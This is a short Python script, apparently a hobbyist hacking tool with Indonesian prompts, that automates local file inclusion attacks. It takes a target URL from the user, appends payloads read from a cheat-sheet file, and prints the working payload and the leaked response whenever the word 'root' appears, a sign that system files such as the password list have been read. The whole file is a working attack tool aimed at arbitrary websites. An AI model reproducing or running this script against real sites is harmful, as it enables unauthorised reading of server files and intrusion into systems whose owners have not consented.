# wardana 27 juli 2020
# local file inclusion
import time
import requests
import readline

print("\nexample link : http://wardana.id/ganteng/file=")
url = input('\nmasukan link website : ')

with open("lficheat-wardana.txt") as lfi:
    data = lfi.readlines()
    for datas in data:
        params = datas.replace('\n', '')
        links = url + params
        responese = requests.get(links)

        if 'root' in responese.text:
            print('\n' + 'payload found : ' + links)
            print('\n' + responese.text)
            break

        elif 'Lah? kamu heiker?' in responese.text:
            print("failed!")
